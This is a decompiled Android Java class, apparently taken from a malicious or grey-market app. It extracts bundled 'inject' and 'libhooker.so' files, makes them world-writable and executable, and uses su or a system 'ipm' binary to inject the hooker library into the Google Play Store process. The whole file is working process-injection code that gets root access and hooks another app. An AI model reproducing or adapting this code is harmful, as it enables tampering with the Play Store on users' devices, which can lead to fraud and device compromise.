package com.ry.inject;

import android.content.Context;
import com.moceanmobile.mast.MASTNativeAdConstants;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.InputStreamReader;
import java.util.concurrent.atomic.AtomicBoolean;

public class JNI {
    public static final String HOOKER_SO_NAME = "libhooker.so";
    public static final String INJECT_NAME = "inject";
    private static final AtomicBoolean mRunning = new AtomicBoolean(false);

    /* access modifiers changed from: private|static|final */
    public static final String shell(String cmd, String wrCmd) {
        StringBuffer buffer = new StringBuffer();
        try {
            Process process = Runtime.getRuntime().exec(cmd);
            DataOutputStream dos = new DataOutputStream(process.getOutputStream());
            dos.writeBytes(new StringBuilder(String.valueOf(wrCmd)).append(MASTNativeAdConstants.NEWLINE).toString());
            dos.flush();
            dos.writeBytes("exit\n");
            dos.flush();
            BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
            while (true) {
                try {
                    String line = br.readLine();
                    if (line == null) {
                        break;
                    }
                    buffer.append(line);
                } catch (Exception e) {
                    BufferedReader bufferedReader = br;
                } catch (Throwable th) {
                    if (br != null) {
                        br.close();
                    }
                }
            }
            if (br != null) {
                br.close();
            }
            process.waitFor();
        } catch (Exception e2) {
        }
        return buffer.toString();
    }

    public static final int startHook(Context context) {
        if (mRunning.getAndSet(true)) {
            return 0;
        }
        try {
            String pack = "com.android.vending";
            try {
                if (context.getPackageManager().getApplicationInfo("com.android.vending", 0) == null) {
                    return -1;
                }
                String basePath = context.getFilesDir().getAbsolutePath();
                final File injectPath = new File(basePath, INJECT_NAME);
                final File hookerPath = new File(basePath, HOOKER_SO_NAME);
                try {
                    RWUtils.write(context.getAssets().open(INJECT_NAME), injectPath);
                    RWUtils.write(context.getAssets().open(HOOKER_SO_NAME), hookerPath);
                    Runtime.getRuntime().exec("chmod 777 " + injectPath);
                    Runtime.getRuntime().exec("chmod 777 " + hookerPath);
                    final File ipm = new File("/system/bin/ipm");
                    File su = new File("/system/bin/su");
                    new Thread(new Runnable() {
                        /* JADX WARNING: Removed duplicated region for block: B:29:0x009c A:{SYNTHETIC, Splitter:B:29:0x009c} */
                        public void run() {
                            /*
                            r9 = this;
                            r0 = 0;
                            r1 = new android.net.LocalSocket;	 Catch:{ Exception -> 0x0039, all -> 0x0099 }
                            r1.<init>();	 Catch:{ Exception -> 0x0039, all -> 0x0099 }
                            r7 = new android.net.LocalSocketAddress;	 Catch:{ Exception -> 0x00bc, all -> 0x00b9 }
                            r8 = "com.gp.modis.service";
                            r7.<init>(r8);	 Catch:{ Exception -> 0x00bc, all -> 0x00b9 }
                            r1.connect(r7);	 Catch:{ Exception -> 0x00bc, all -> 0x00b9 }
                            r5 = new java.io.BufferedReader;	 Catch:{ Exception -> 0x00bc, all -> 0x00b9 }
                            r7 = new java.io.InputStreamReader;	 Catch:{ Exception -> 0x00bc, all -> 0x00b9 }
                            r8 = r1.getInputStream();	 Catch:{ Exception -> 0x00bc, all -> 0x00b9 }
                            r7.<init>(r8);	 Catch:{ Exception -> 0x00bc, all -> 0x00b9 }
                            r5.<init>(r7);	 Catch:{ Exception -> 0x00bc, all -> 0x00b9 }
                            r4 = r5.readLine();	 Catch:{ Exception -> 0x00bc, all -> 0x00b9 }
                            r5.close();	 Catch:{ Exception -> 0x00bc, all -> 0x00b9 }
                            r7 = "OK";
                            r7 = r7.equals(r4);	 Catch:{ Exception -> 0x00bc, all -> 0x00b9 }
                            if (r7 == 0) goto L_0x00a5;
                        L_0x002d:
                            if (r1 == 0) goto L_0x0032;
                        L_0x002f:
                            r1.close();	 Catch:{ IOException -> 0x0034 }
                        L_0x0032:
                            r0 = r1;
                        L_0x0033:
                            return;
                        L_0x0034:
                            r3 = move-exception;
                            r3.printStackTrace();
                            goto L_0x0032;
                        L_0x0039:
                            r7 = move-exception;
                        L_0x003a:
                            if (r0 == 0) goto L_0x003f;
                        L_0x003c:
                            r0.close();	 Catch:{ IOException -> 0x0094 }
                        L_0x003f:
                            r7 = new java.lang.StringBuilder;
                            r7.<init>();
                            r8 = r3;
                            r7 = r7.append(r8);
                            r8 = " ";
                            r7 = r7.append(r8);
                            r8 = "com.android.vending";
                            r7 = r7.append(r8);
                            r8 = " ";
                            r7 = r7.append(r8);
                            r8 = r2;
                            r7 = r7.append(r8);
                            r8 = " hook_entry hahaha";
                            r7 = r7.append(r8);
                            r2 = r7.toString();
                            r7 = r4;
                            r7 = r7.exists();
                            if (r7 == 0) goto L_0x00b2;
                        L_0x0074:
                            r7 = r4;
                            r7 = r7.canExecute();
                            if (r7 == 0) goto L_0x00b2;
                        L_0x007c:
                            r7 = "ipm";
                            r8 = "echo root";
                            r6 = com.ry.inject.JNI.shell(r7, r8);
                            if (r6 == 0) goto L_0x00b2;
                        L_0x0086:
                            r7 = "root";
                            r7 = r6.contains(r7);
                            if (r7 == 0) goto L_0x00b2;
                        L_0x008e:
                            r7 = "ipm";
                            com.ry.inject.JNI.shell(r7, r2);
                            goto L_0x0033;
                        L_0x0094:
                            r3 = move-exception;
                            r3.printStackTrace();
                            goto L_0x003f;
                        L_0x0099:
                            r7 = move-exception;
                        L_0x009a:
                            if (r0 == 0) goto L_0x009f;
                        L_0x009c:
                            r0.close();	 Catch:{ IOException -> 0x00a0 }
                        L_0x009f:
                            throw r7;
                        L_0x00a0:
                            r3 = move-exception;
                            r3.printStackTrace();
                            goto L_0x009f;
                        L_0x00a5:
                            if (r1 == 0) goto L_0x00b0;
                        L_0x00a7:
                            r1.close();	 Catch:{ IOException -> 0x00ac }
                            r0 = r1;
                            goto L_0x003f;
                        L_0x00ac:
                            r3 = move-exception;
                            r3.printStackTrace();
                        L_0x00b0:
                            r0 = r1;
                            goto L_0x003f;
                        L_0x00b2:
                            r7 = "su";
                            com.ry.inject.JNI.shell(r7, r2);
                            goto L_0x0033;
                        L_0x00b9:
                            r7 = move-exception;
                            r0 = r1;
                            goto L_0x009a;
                        L_0x00bc:
                            r7 = move-exception;
                            r0 = r1;
                            goto L_0x003a;
                            */
                            throw new UnsupportedOperationException("Method not decompiled: com.ry.inject.JNI$AnonymousClass1.run():void");
                        }
                    }).start();
                    if (ipm.canExecute() || su.canExecute()) {
                        mRunning.set(false);
                        return 1;
                    }
                    mRunning.set(false);
                    return -3;
                } catch (Exception e) {
                    mRunning.set(false);
                    return -2;
                }
            } catch (Exception e2) {
                mRunning.set(false);
                return -1;
            }
        } finally {
            mRunning.set(false);
        }
    }
}
